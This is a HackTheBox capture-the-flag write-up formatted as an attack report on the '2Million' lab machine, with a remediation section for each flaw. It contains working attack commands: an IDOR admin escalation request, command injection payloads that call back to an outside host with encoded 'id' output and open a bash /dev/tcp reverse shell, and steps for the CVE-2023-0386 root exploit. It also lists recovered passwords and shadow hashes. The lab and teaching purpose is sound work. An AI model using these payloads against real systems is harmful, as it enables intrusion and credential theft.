# Attack Report: 10.129.32.120 (2Million — HackTheBox)

**Date:** 2026-04-18  
**Attacker:** Zuzu 🐱‍💻  
**Target:** 10.129.32.120 (2million.htb)  
**Result:** ✅ Full compromise — User + Root flags obtained  
**Difficulty:** Easy  

---

## Executive Summary

The target is a retired HackTheBox machine running a replica of the old HackTheBox website. The attack chain involved:

1. **Invite code generation** via obfuscated JavaScript reverse engineering
2. **API enumeration** revealing admin endpoints with no authorization
3. **Privilege escalation to admin** via insecure settings update endpoint (IDOR)
4. **Remote Code Execution** via OS command injection in VPN generation endpoint
5. **Credential reuse** from `.env` database credentials to SSH
6. **Kernel exploit (CVE-2023-0386)** OverlayFS FUSE privilege escalation to root

---

## Flags

| Flag | Value |
|------|-------|
| **User** | `436a33dd7cca8329e69d590f3df1b38d` |
| **Root** | `aaa44b968c6fdac3b8c5bb6805347ab4` |

---

## Target Information

| Property | Value |
|----------|-------|
| IP | 10.129.32.120 |
| Hostname | 2million.htb |
| OS | Ubuntu 22.04.2 LTS |
| Kernel | 5.15.70-051570-generic |
| Web Server | Nginx + PHP |
| SSH | OpenSSH 8.9p1 |

---

## Reconnaissance

### Port Scan (TCP)

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx → redirect to http://2million.htb/
```

8 additional filtered ports (likely firewall noise).

### Port Scan (UDP)

Top 50 UDP ports scanned — all closed or filtered. No UDP services exposed.

### Web Application

- The site is a replica of the old HackTheBox platform
- Login page at `/login`
- Invite-only registration at `/invite`
- API at `/api/v1` with documented endpoints

---

## Vulnerability Assessment & Exploitation

### Vuln 1: Invite Code Generation via JavaScript Reverse Engineering

**Severity:** Low (Information Disclosure)  
**CVSS:** 3.7  
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)

**Details:**  
The `/invite` page loads `/js/inviteapi.min.js`, which is obfuscated with a simple eval/packer. Deobfuscation reveals two functions:

- `verifyInviteCode(code)` → POST to `/api/v1/invite/verify`
- `makeInviteCode()` → POST to `/api/v1/invite/how/to/generate`

**Exploitation:**
```bash
# Step 1: Get instructions (ROT13 encoded)
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
# Response: ROT13 → "make a POST request to /api/v1/invite/generate"

# Step 2: Generate invite code (Base64 encoded)
curl -s -X POST http://2million.htb/api/v1/invite/generate
# Response: Base64 → valid invite code

# Step 3: Register account
curl -d "code=<CODE>&username=zuzu2&email=zuzu2@hacker.htb&password=ZuzuH4ck3r!" \
  http://2million.htb/api/v1/user/register
```

**Remediation:** Don't expose invite generation logic in client-side JavaScript.

---

### Vuln 2: API Authorization Bypass — Admin Privilege Escalation (IDOR)

**Severity:** Critical  
**CVSS:** 9.8  
**MITRE ATT&CK:** T1548 (Abuse Elevation Control Mechanism)

**Details:**  
The API exposes `PUT /api/v1/admin/settings/update` which allows any authenticated user to update their `is_admin` flag. There is no server-side authorization check.

**API Endpoint Discovery:**
```
GET /api/v1 → Returns full route list including admin endpoints
```

**Exploitation:**
```bash
# Check current admin status
curl -b "PHPSESSID=<session>" http://2million.htb/api/v1/admin/auth
# Response: {"message":false}

# Escalate to admin
curl -X PUT -H "Content-Type: application/json" \
  -b "PHPSESSID=<session>" \
  -d '{"email":"zuzu2@hacker.htb","is_admin":1}' \
  http://2million.htb/api/v1/admin/settings/update
# Response: {"id":14,"username":"zuzu2","is_admin":1}

# Verify
curl -b "PHPSESSID=<session>" http://2million.htb/api/v1/admin/auth
# Response: {"message":true}
```

**Remediation:** Implement proper authorization checks. Never allow users to modify their own privilege level.

---

### Vuln 3: OS Command Injection in VPN Generation (RCE)

**Severity:** Critical  
**CVSS:** 10.0  
**MITRE ATT&CK:** T1059.004 (Command and Scripting Interpreter: Unix Shell)

**Details:**  
The `POST /api/v1/admin/vpn/generate` endpoint takes a `username` parameter that is passed directly to a shell command (likely `system()` or `exec()`) without sanitization.

**Exploitation:**
```bash
# Proof of Concept — command injection via semicolon
curl -X POST -H "Content-Type: application/json" \
  -b "PHPSESSID=<session>" \
  -d '{"username":"zuzu2;curl http://10.10.15.102:9001/$(id|base64)"}' \
  http://2million.htb/api/v1/admin/vpn/generate

# Callback received:
# GET /dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
# Decoded: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse Shell
curl -X POST -H "Content-Type: application/json" \
  -b "PHPSESSID=<session>" \
  -d '{"username":"zuzu2;bash -c \"bash -i >& /dev/tcp/10.10.15.102/4445 0>&1\""}' \
  http://2million.htb/api/v1/admin/vpn/generate
```

**Result:** Reverse shell as `www-data`.

**Remediation:** 
- Never pass user input directly to shell commands
- Use parameterized calls or allowlist validation
- Implement input validation and sanitization

---

### Vuln 4: Credential Reuse — .env File Exposure

**Severity:** High  
**CVSS:** 7.5  
**MITRE ATT&CK:** T1552.001 (Credentials In Files)

**Details:**  
The web application's `.env` file (at `/var/www/html/.env`) contains plaintext database credentials:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

The database password `SuperDuperPass123` is reused as the SSH password for the `admin` user.

**Exploitation:**
```bash
ssh admin@10.129.32.120
# Password: SuperDuperPass123
# → Shell as admin user
```

**User flag obtained:** `436a33dd7cca8329e69d590f3df1b38d`

**Remediation:**
- Use unique passwords for each service
- Use a secrets manager instead of `.env` files
- Restrict `.env` file permissions

---

### Vuln 5: Kernel Privilege Escalation — CVE-2023-0386 (OverlayFS FUSE)

**Severity:** Critical  
**CVSS:** 7.8  
**MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation)

**Details:**  
The kernel version `5.15.70-051570-generic` is vulnerable to CVE-2023-0386, an OverlayFS/FUSE vulnerability that allows an unprivileged user to gain root privileges.

The vulnerability exists because OverlayFS does not properly check permissions when copying files from a FUSE-mounted lower layer to the upper layer, allowing a user to create a SUID binary owned by root.

**Hint:** The admin user has mail from `ch4p` (HTB Godfather) explicitly mentioning "That one in OverlayFS / FUSE looks nasty."

**Exploitation:**
```bash
# Transfer CVE-2023-0386 exploit to target
scp CVE-2023-0386.tar.gz admin@10.129.32.120:/tmp/

# On target:
cd /tmp && tar xzf CVE-2023-0386.tar.gz && cd CVE-2023-0386
make all

# Terminal 1: Start FUSE filesystem
./fuse ./ovlcap/lower ./gc &

# Terminal 2: Run exploit
./exp

# Result: root shell
# uid=0(root) gid=0(root) groups=0(root),1000(admin)
```

**Root flag obtained:** `aaa44b968c6fdac3b8c5bb6805347ab4`

**Remediation:**
- Update kernel to patched version (>= 5.15.90)
- Apply Ubuntu security patches
- Consider disabling user namespaces: `sysctl kernel.unprivileged_userns_clone=0`

---

## Credentials Recovered

| User | Password/Hash | Source |
|------|---------------|--------|
| admin (DB) | `SuperDuperPass123` | `/var/www/html/.env` |
| admin (SSH) | `SuperDuperPass123` | Password reuse |
| root | `$y$j9T$lMX63DLnmS7C2fo11Mluz0$orSq4ixScTWZCqbOolOvi7GqJtj0h/4oyA..NydDMn7` | `/etc/shadow` |
| admin | `$y$j9T$M.rrzwF088SlZEp26ePcN/$tkFiTne68BW.DOnV4I90X.wIuGYM/gWU5jTgbOlzztD` | `/etc/shadow` |
| TRX (DB) | `$2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq` | MySQL `htb_prod.users` |
| TheCyberGeek (DB) | `$2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK` | MySQL `htb_prod.users` |

---

## Attack Flow Diagram

```
[Nmap Scan] → Port 80 (HTTP) + Port 22 (SSH)
     │
     ▼
[Web Enumeration] → /invite page → /js/inviteapi.min.js
     │
     ▼
[Deobfuscate JS] → makeInviteCode() → /api/v1/invite/how/to/generate
     │
     ▼
[ROT13 Decode] → POST /api/v1/invite/generate → Base64 invite code
     │
     ▼
[Register Account] → Login → Authenticated session
     │
     ▼
[API Enumeration] → GET /api/v1 → Discover admin endpoints
     │
     ▼
[IDOR] → PUT /api/v1/admin/settings/update → is_admin=1
     │
     ▼
[Command Injection] → POST /api/v1/admin/vpn/generate → RCE as www-data
     │
     ▼
[Reverse Shell] → www-data shell → Read .env → DB credentials
     │
     ▼
[Password Reuse] → SSH as admin → USER FLAG ✅
     │
     ▼
[Kernel Exploit] → CVE-2023-0386 (OverlayFS/FUSE) → ROOT FLAG ✅
```

---

## Remediation Summary

| # | Issue | Severity | Recommendation |
|---|-------|----------|----------------|
| 1 | Client-side invite generation logic | Low | Move logic server-side |
| 2 | Missing API authorization (IDOR) | Critical | Implement role-based access control |
| 3 | OS command injection in VPN endpoint | Critical | Sanitize input, use parameterized commands |
| 4 | Plaintext credentials in .env | High | Use secrets manager, unique passwords |
| 5 | Outdated kernel (CVE-2023-0386) | Critical | Patch kernel, disable user namespaces |
| 6 | Password reuse (DB → SSH) | High | Enforce unique credentials per service |

---

## Additional Artifacts

- **thank_you.json** — Contains an encoded/encrypted message from HTB (URL → Hex → XOR with key "HackTheBox" → Base64)
- **Cleanup script** at `/root/.cleanup/clean.sh` — Resets VPN directory
- **Database** `htb_prod` with 4 user accounts (2 admin: TRX, TheCyberGeek)

---

*Report generated by Zuzu 🐱‍💻 — "Ghost in the Kali machine"*
